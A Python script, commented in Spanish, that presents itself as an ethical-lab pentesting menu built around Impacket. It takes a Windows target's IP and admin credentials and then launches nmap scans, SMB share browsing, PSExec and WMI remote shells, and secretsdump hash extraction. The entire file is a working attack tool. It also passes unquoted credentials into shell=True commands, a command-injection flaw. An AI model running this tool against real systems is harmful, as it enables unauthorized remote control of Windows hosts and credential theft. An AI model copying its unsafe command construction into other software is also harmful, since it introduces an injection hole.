#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DESCRIPCIÓN DEL SCRIPT:
Menú Interactivo para Pentesting con Impacket
Framework de hacking ético que utiliza herramientas de la suite Impacket
para realizar pruebas de seguridad contra sistemas Windows desde Kali Linux.

FUNCIONALIDAD PRINCIPAL:
- Detección automática de IP de Kali Linux con 4 métodos diferentes
- Autenticación y validación de credenciales contra sistemas Windows
- Menú interactivo con operaciones de pentesting (SMB, WMI, PSExec, etc.)
- Interfaz visual estilo hacker con colores y efectos

RESULTADO AL EJECUTAR:
1. Interfaz visual con detección automática de IP
2. Solicitud de parámetros del objetivo Windows
3. Validación de credenciales
4. Menú interactivo para ejecutar herramientas de Impacket
5. Operaciones guiadas de pentesting en entorno controlado

USO: Laboratorios de pentesting ético y entornos autorizados
"""

import os
import sys
import subprocess
import time
import socket
import netifaces
import random
from colorama import Fore, Back, Style, init

# Inicializar colorama
init(autoreset=True)

class HackerMenu:
    def __init__(self):
        # Configuración por defecto - Detección robusta de IP
        self.kali_ip = self.detectar_ip_kali_robusta()
        self.windows_ip = ""
        self.username = ""
        self.password = ""
        self.impacket_path = "/usr/share/doc/python3-impacket/examples/"
        self.credenciales_validas = False
    
    def detectar_ip_kali_robusta(self):
        """Detección más robusta de la IP de Kali Linux"""
        metodos = [
            self._detectar_ip_metodo1,  # hostname -I
            self._detectar_ip_metodo2,  # ip route
            self._detectar_ip_metodo3,  # netifaces
            self._detectar_ip_metodo4,  # socket gethostbyname
        ]
        
        for i, metodo in enumerate(metodos, 1):
            try:
                ip = metodo()
                if ip and ip != "127.0.0.1" and self.validar_ip(ip):
                    print(f"{Fore.GREEN}[✓] IP detectada (Método {i}): {ip}")
                    return ip
            except Exception as e:
                print(f"{Fore.YELLOW}[!] Método {i} falló: {e}")
                continue
        
        # Si todos los métodos fallan, solicitar IP manualmente
        print(f"{Fore.RED}[!] No se pudo detectar la IP automáticamente")
        return self._solicitar_ip_manual()
    
    def _detectar_ip_metodo1(self):
        """Método 1: Usando hostname -I (más confiable)"""
        result = subprocess.run(['hostname', '-I'], capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            ips = result.stdout.strip().split()
            for ip in ips:
                if self.validar_ip(ip) and not ip.startswith('127.'):
                    return ip
        return None
    
    def _detectar_ip_metodo2(self):
        """Método 2: Usando ip route (para obtener IP de gateway)"""
        result = subprocess.run(['ip', 'route', 'get', '1'], capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            lines = result.stdout.split('\n')
            for line in lines:
                if 'src' in line:
                    parts = line.split()
                    for i, part in enumerate(parts):
                        if part == 'src' and i + 1 < len(parts):
                            ip = parts[i + 1]
                            if self.validar_ip(ip):
                                return ip
        return None
    
    def _detectar_ip_metodo3(self):
        """Método 3: Usando netifaces"""
        try:
            interfaces = netifaces.interfaces()
            for interface in interfaces:
                if interface == 'lo':
                    continue
                addrs = netifaces.ifaddresses(interface)
                if netifaces.AF_INET in addrs:
                    ip_info = addrs[netifaces.AF_INET][0]
                    if 'addr' in ip_info and not ip_info['addr'].startswith('127.'):
                        return ip_info['addr']
        except:
            pass
        return None
    
    def _detectar_ip_metodo4(self):
        """Método 4: Usando socket (último recurso)"""
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        if ip and not ip.startswith('127.'):
            return ip
        return None
    
    def _solicitar_ip_manual(self):
        """Solicita la IP manualmente si la detección automática falla"""
        print(f"{Fore.YELLOW}\n[!] Es necesario configurar la IP de Kali manualmente")
        while True:
            ip = input(f"{Fore.GREEN}[?] Ingresa la IP de Kali Linux: ").strip()
            if ip and self.validar_ip(ip):
                return ip
            else:
                print(f"{Fore.RED}[!] IP no válida. Intenta nuevamente.")
    
    def efecto_hacker(self, texto, delay=0.02, color=Fore.GREEN):
        """Efecto de escritura tipo hacker"""
        for char in texto:
            print(color + char, end='', flush=True)
            time.sleep(delay)
        print()
    
    def mostrar_banner(self):
        """Muestra el banner pequeño de ElBuhoDev"""
        banner = f"""
{Fore.GREEN}╔═╗╦  ╔╦╗╦ ╦╔═╗╦ ╦╔╦╗
{Fore.GREEN}║ ║║   ║ ║║║║╣ ║ ║ ║ 
{Fore.GREEN}╚═╝╩═╝ ╩ ╚╩╝╚═╝╚═╝ ╩ {Fore.CYAN}Dev
{Fore.GREEN}┌────────────────────────────────────────────────────┐
{Fore.GREEN}│ {Fore.CYAN}          HACKING FRAMEWORK v2.0{Fore.GREEN}               │
{Fore.GREEN}│ {Fore.YELLOW}         Laboratorio de Pentesting{Fore.GREEN}           │
{Fore.GREEN}└────────────────────────────────────────────────────┘
"""
        print(banner)
    
    def mostrar_estado_sistema(self):
        """Muestra el estado del sistema con estilo hacker"""
        estado_color = Fore.GREEN if self.credenciales_validas else Fore.RED
        estado_texto = "ACCESO CONCEDIDO" if self.credenciales_validas else "ACCESO DENEGADO"
        
        print(f"{Fore.GREEN}┌─────────────{Fore.CYAN}[ {Fore.WHITE}ESTADO DEL SISTEMA {Fore.CYAN}]{Fore.GREEN}─────────────┐")
        print(f"{Fore.GREEN}│ {Fore.CYAN}► KALI:    {Fore.GREEN}{self.kali_ip:<28} {Fore.GREEN}│")
        print(f"{Fore.GREEN}│ {Fore.CYAN}► OBJETIVO: {Fore.RED}{self.windows_ip:<28} {Fore.GREEN}│")
        print(f"{Fore.GREEN}│ {Fore.CYAN}► USUARIO:  {Fore.YELLOW}{self.username:<28} {Fore.GREEN}│")
        print(f"{Fore.GREEN}│ {Fore.CYAN}► ESTADO:   {estado_color}{estado_texto:<28} {Fore.GREEN}│")
        print(f"{Fore.GREEN}└────────────────────────────────────────────────────┘")
        print()
    
    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def animacion_inicio(self):
        """Animación de inicio estilo hacker"""
        self.clear_screen()
        print(f"{Fore.GREEN}")
        print("Inicializando sistema de detección de red...")
        
        # Probar diferentes métodos de detección
        print(f"{Fore.CYAN}[+] Probando métodos de detección de IP...")
        time.sleep(1)
        
        # La IP ya fue detectada en el __init__, solo mostramos resultado
        print(f"{Fore.GREEN}[✓] IP configurada: {self.kali_ip}")
        time.sleep(0.5)
    
    def solicitar_configuracion(self):
        """Solicita la configuración con estilo hacker"""
        self.clear_screen()
        self.mostrar_banner()
        
        print(f"{Fore.GREEN}[✓] IP KALI DETECTADA: {Fore.WHITE}{self.kali_ip}")
        
        # Preguntar si quiere modificar la IP detectada
        modificar = input(f"{Fore.YELLOW}[?] ¿Usar esta IP o modificar? (s/n): ").strip().lower()
        if modificar == 's':
            while True:
                nueva_ip = input(f"{Fore.GREEN}[?] Nueva IP de Kali: ").strip()
                if nueva_ip and self.validar_ip(nueva_ip):
                    self.kali_ip = nueva_ip
                    break
                else:
                    print(f"{Fore.RED}[!] IP no válida. Intenta nuevamente.")
        
        time.sleep(0.5)
        
        self.efecto_hacker("[+] INGRESE PARÁMETROS DEL OBJETIVO:", 0.02, Fore.YELLOW)
        print()
        
        # IP de Windows
        while True:
            print(f"{Fore.RED}┌─({Fore.WHITE}OBJETIVO{Fore.RED})─[{Fore.GREEN}IP Windows{Fore.RED}]─{Fore.WHITE}> ", end='')
            self.windows_ip = input().strip()
            if self.windows_ip:
                if self.validar_ip(self.windows_ip):
                    if self.windows_ip != self.kali_ip:
                        break
                    else:
                        print(f"{Fore.RED}[!] ERROR: El objetivo no puede ser local")
                else:
                    print(f"{Fore.RED}[!] ERROR: Formato de IP inválido")
            else:
                print(f"{Fore.RED}[!] ERROR: Campo requerido")
        
        # Usuario
        while True:
            print(f"{Fore.RED}┌─({Fore.WHITE}OBJETIVO{Fore.RED})─[{Fore.GREEN}Usuario Admin{Fore.RED}]─{Fore.WHITE}> ", end='')
            self.username = input().strip()
            if self.username:
                break
            else:
                print(f"{Fore.RED}[!] ERROR: Campo requerido")
        
        # Contraseña
        while True:
            print(f"{Fore.RED}┌─({Fore.WHITE}OBJETIVO{Fore.RED})─[{Fore.GREEN}Contraseña{Fore.RED}]─{Fore.WHITE}> ", end='')
            self.password = input().strip()
            if self.password:
                # Mostrar asteriscos
                print(f"{Fore.GREEN}" + "█" * len(self.password))
                break
            else:
                print(f"{Fore.RED}[!] ERROR: Campo requerido")
        
        # Validación
        self.efecto_hacker(f"\n[+] AUTENTICANDO CON {self.windows_ip}...", 0.01, Fore.YELLOW)
        for i in range(3):
            print(f"{Fore.CYAN}[{i+1}/3] Verificando credenciales...", end='\r')
            time.sleep(0.7)
        
        self.validar_credenciales()
        
        if self.credenciales_validas:
            print(f"{Fore.GREEN}[✓] AUTENTICACIÓN EXITOSA - SISTEMA COMPROMETIDO")
        else:
            print(f"{Fore.RED}[!] FALLA DE AUTENTICACIÓN")
            print(f"{Fore.YELLOW}[!] ALGUNAS OPERACIONES PUEDEN FALLAR")
        
        print(f"{Fore.CYAN}\n[+] PRESIONE ENTER PARA ACCEDER AL MENÚ PRINCIPAL...", end='')
        input()
    
    def validar_credenciales(self):
        """Valida las credenciales"""
        try:
            test_cmd = f"python3 {self.impacket_path}wmiexec.py {self.username}:{self.password}@{self.windows_ip} 'echo OK'"
            
            result = subprocess.run(
                test_cmd, 
                shell=True, 
                capture_output=True, 
                text=True,
                timeout=15
            )
            
            if result.returncode == 0 and "OK" in result.stdout:
                self.credenciales_validas = True
            else:
                self.credenciales_validas = False
                    
        except:
            self.credenciales_validas = False
    
    def validar_ip(self, ip):
        """Valida formato IP"""
        if not ip:
            return False
            
        partes = ip.split('.')
        if len(partes) != 4:
            return False
            
        for parte in partes:
            if not parte.isdigit():
                return False
            num = int(parte)
            if num < 0 or num > 255:
                return False
                
        return True
    
    def mostrar_menu_principal(self):
        """Muestra el menú principal estilo hacker"""
        print(f"{Fore.GREEN}┌─────────────{Fore.CYAN}[ {Fore.WHITE}MENÚ DE OPERACIONES {Fore.CYAN}]{Fore.GREEN}──────────┐")
        
        opciones = [
            ("1", "RECONOCIMIENTO", "Escaneo de red y puertos"),
            ("2", "EXPLOTACIÓN SMB", "Acceso a recursos compartidos"),
            ("3", "EJECUCIÓN REMOTA", "Shell con PSExec"),
            ("4", "CONSOLA WMI", "Shell alternativo"),
            ("5", "EXTRACCIÓN HASHES", "Obtención de credenciales"),
            ("6", "CRACKEO", "Herramientas de cracking"),
            ("7", "ENUMERACIÓN", "Servicios del sistema"),
            ("8", "REGISTRO", "Acceso al registro"),
            ("9", "CONFIGURACIÓN", "Ajustes del sistema"),
            ("0", "SALIR", "Terminar sesión")
        ]
        
        for num, nombre, desc in opciones:
            if num == "0":
                color = Fore.RED
            elif num == "9":
                color = Fore.CYAN
            else:
                color = Fore.GREEN
                
            print(f"{Fore.GREEN}│ {color}▶ {num}. {Fore.WHITE}{nombre:<18} {Fore.YELLOW}{desc:<25} {Fore.GREEN}│")
        
        print(f"{Fore.GREEN}└────────────────────────────────────────────────────┘")
        
        if not self.credenciales_validas:
            print(f"{Fore.RED}[!] ADVERTENCIA: Autenticación requerida para operaciones completas")
        
        print(f"{Fore.GREEN}\n┌─({Fore.WHITE}root{Fore.GREEN})─[{Fore.CYAN}menu{Fore.GREEN}]─{Fore.WHITE}> ", end='')
    
    def ejecutar_comando(self, comando, descripcion=""):
        """Ejecuta un comando con estilo hacker"""
        if descripcion:
            print(f"{Fore.YELLOW}[+] {descripcion}...")
        
        print(f"{Fore.CYAN}┌─[{Fore.WHITE}EJECUTANDO{Fore.CYAN}]─{Fore.GREEN}{comando}")
        print(f"{Fore.GREEN}│")
        
        try:
            # Efecto de progreso
            for i in range(2):
                print(f"{Fore.CYAN}│ [{i+1}/2] Procesando...", end='\r')
                time.sleep(0.4)
            
            resultado = subprocess.run(comando, shell=True, capture_output=False, text=True)
            print(f"{Fore.GREEN}│")
            print(f"{Fore.GREEN}└─[{Fore.CYAN}COMPLETADO{Fore.GREEN}]─ Operación finalizada")
            
        except KeyboardInterrupt:
            print(f"{Fore.RED}\n└─[INTERRUMPIDO]─ Operación cancelada por el usuario")
        except Exception as e:
            print(f"{Fore.RED}\n└─[ERROR]─ {e}")
        
        print(f"{Fore.CYAN}[+] Presione ENTER para continuar...", end='')
        input()

    def opcion_1(self):
        """Reconocimiento de red"""
        print(f"{Fore.CYAN}\n[=== RECONOCIMIENTO DE RED ===]")
        
        # Ping
        self.ejecutar_comando(
            f"ping -c 4 {self.windows_ip}",
            "Realizando ping al objetivo"
        )
        
        # Nmap
        self.ejecutar_comando(
            f"nmap -sV -sC {self.windows_ip}",
            "Escaneo avanzado de puertos y servicios"
        )
    
    def opcion_2(self):
        """Explotación SMB"""
        if not self.credenciales_validas:
            print(f"{Fore.RED}[!] AUTENTICACIÓN REQUERIDA")
            respuesta = input(f"{Fore.YELLOW}[?] ¿Continuar? (s/n): ").strip().lower()
            if respuesta != 's':
                return
        
        self.mostrar_guia_smb()
        
        comando = f"python3 {self.impacket_path}smbclient.py {self.username}:{self.password}@{self.windows_ip}"
        
        print(f"{Fore.YELLOW}[+] INICIANDO EXPLOTACIÓN SMB...")
        print(f"{Fore.GREEN}┌─[{Fore.WHITE}SMB CLIENT{Fore.GREEN}]─ Conectando a {self.windows_ip}")
        
        try:
            subprocess.run(comando, shell=True)
        except KeyboardInterrupt:
            print(f"{Fore.RED}└─[SESION TERMINADA]─ Por el usuario")
        except Exception as e:
            print(f"{Fore.RED}└─[ERROR]─ {e}")
        
        print(f"{Fore.CYAN}[+] Presione ENTER para continuar...", end='')
        input()
    
    def mostrar_guia_smb(self):
        """Muestra guía para SMB"""
        print(f"{Fore.CYAN}\n[=== GUÍA DE EXPLOTACIÓN SMB ===]")
        print(f"{Fore.GREEN}┌────────────────────────────────────────────────────┐")
        print(f"{Fore.GREEN}│ {Fore.YELLOW}🎯 OBJETIVO: Comprometer recursos compartidos        {Fore.GREEN}│")
        print(f"{Fore.GREEN}│                                                    {Fore.GREEN}│")
        print(f"{Fore.GREEN}│ {Fore.CYAN}COMANDOS ESENCIALES:                           {Fore.GREEN}│")
        print(f"{Fore.GREEN}│ {Fore.WHITE}shares          {Fore.YELLOW}Listar recursos compartidos         {Fore.GREEN}│")
        print(f"{Fore.GREEN}│ {Fore.WHITE}use C           {Fore.YELLOW}Acceder al disco C:                {Fore.GREEN}│")
        print(f"{Fore.GREEN}│ {Fore.WHITE}ls              {Fore.YELLOW}Listar archivos                    {Fore.GREEN}│")
        print(f"{Fore.GREEN}│ {Fore.WHITE}cd Users        {Fore.YELLOW}Navegar a usuarios                 {Fore.GREEN}│")
        print(f"{Fore.GREEN}│ {Fore.WHITE}get archivo     {Fore.YELLOW}Descargar archivo                  {Fore.GREEN}│")
        print(f"{Fore.GREEN}│                                                    {Fore.GREEN}│")
        print(f"{Fore.GREEN}│ {Fore.RED}⚠️  SIN 'use C' VERÁS 'No share selected'     {Fore.GREEN}│")
        print(f"{Fore.GREEN}└────────────────────────────────────────────────────┘")
        print(f"{Fore.CYAN}[+] Presione ENTER para iniciar la sesión SMB...", end='')
        input()

    def opcion_3(self):
        """Ejecución remota con PSExec"""
        if not self.credenciales_validas:
            print(f"{Fore.RED}[!] AUTENTICACIÓN REQUERIDA")
            return
        
        comando = f"python3 {self.impacket_path}psexec.py {self.username}:{self.password}@{self.windows_ip}"
        self.ejecutar_comando(comando, "Iniciando shell remoto con PSExec")
    
    def opcion_4(self):
        """Consola WMI"""
        if not self.credenciales_validas:
            print(f"{Fore.RED}[!] AUTENTICACIÓN REQUERIDA")
            return
        
        comando = f"python3 {self.impacket_path}wmiexec.py {self.username}:{self.password}@{self.windows_ip}"
        self.ejecutar_comando(comando, "Iniciando consola WMI")
    
    def opcion_5(self):
        """Extracción de hashes"""
        if not self.credenciales_validas:
            print(f"{Fore.RED}[!] AUTENTICACIÓN REQUERIDA")
            return
        
        comando = f"python3 {self.impacket_path}secretsdump.py {self.username}@{self.windows_ip} -p '{self.password}'"
        self.ejecutar_comando(comando, "Extrayendo hashes de credenciales")
    
    def opcion_9(self):
        """Configuración del sistema"""
        print(f"{Fore.CYAN}\n[=== CONFIGURACIÓN DEL SISTEMA ===]")
        
        print(f"{Fore.GREEN}┌────────────────────────────────────────────────────┐")
        print(f"{Fore.GREEN}│ {Fore.YELLOW}CONFIGURACIÓN ACTUAL:{Fore.GREEN}                               │")
        print(f"{Fore.GREEN}│ {Fore.CYAN}Kali:    {Fore.GREEN}{self.kali_ip:<40} {Fore.GREEN}│")
        print(f"{Fore.GREEN}│ {Fore.CYAN}Objetivo: {Fore.RED}{self.windows_ip:<40} {Fore.GREEN}│")
        print(f"{Fore.GREEN}│ {Fore.CYAN}Usuario:  {Fore.YELLOW}{self.username:<40} {Fore.GREEN}│")
        print(f"{Fore.GREEN}└────────────────────────────────────────────────────┘")
        
        # Permitir modificar la IP de Kali
        nueva_kali = input(f"{Fore.GREEN}[?] Nueva IP Kali ({self.kali_ip}): ").strip()
        if nueva_kali and self.validar_ip(nueva_kali):
            self.kali_ip = nueva_kali
            print(f"{Fore.GREEN}[✓] IP de Kali actualizada")
        
        input(f"{Fore.CYAN}[+] Presione ENTER para continuar...")
    
    def run(self):
        """Bucle principal del framework de pentesting"""
        self.animacion_inicio()
        self.solicitar_configuracion()
        
        while True:
            self.clear_screen()
            self.mostrar_banner()
            self.mostrar_estado_sistema()
            self.mostrar_menu_principal()
            
            try:
                opcion = input().strip()
                
                if opcion == "0":
                    print(f"{Fore.GREEN}\n[+] Cerrando sesión... ¡Hasta la próxima! 🦉")
                    sys.exit(0)
                elif opcion == "1":
                    self.opcion_1()
                elif opcion == "2":
                    self.opcion_2()
                elif opcion == "3":
                    self.opcion_3()
                elif opcion == "4":
                    self.opcion_4()
                elif opcion == "5":
                    self.opcion_5()
                elif opcion == "9":
                    self.opcion_9()
                else:
                    print(f"{Fore.RED}[!] OPCIÓN NO VÁLIDA")
                    time.sleep(1)
            
            except KeyboardInterrupt:
                print(f"{Fore.RED}\n\n[!] SESIÓN TERMINADA POR EL USUARIO")
                sys.exit(0)
            except Exception as e:
                print(f"{Fore.RED}\n[!] ERROR: {e}")
                time.sleep(2)

if __name__ == "__main__":
    # Verificar permisos de root para funcionalidad completa
    if os.geteuid() != 0:
        print(f"{Fore.YELLOW}[!] EJECUTE COMO ROOT PARA MÁS FUNCIONALIDAD")
    
    # Verificar dependencias
    try:
        import netifaces
    except ImportError:
        print(f"{Fore.YELLOW}[!] netifaces no instalado. Usando detección básica.")
    
    # Iniciar el framework de pentesting
    menu = HackerMenu()
    menu.run()
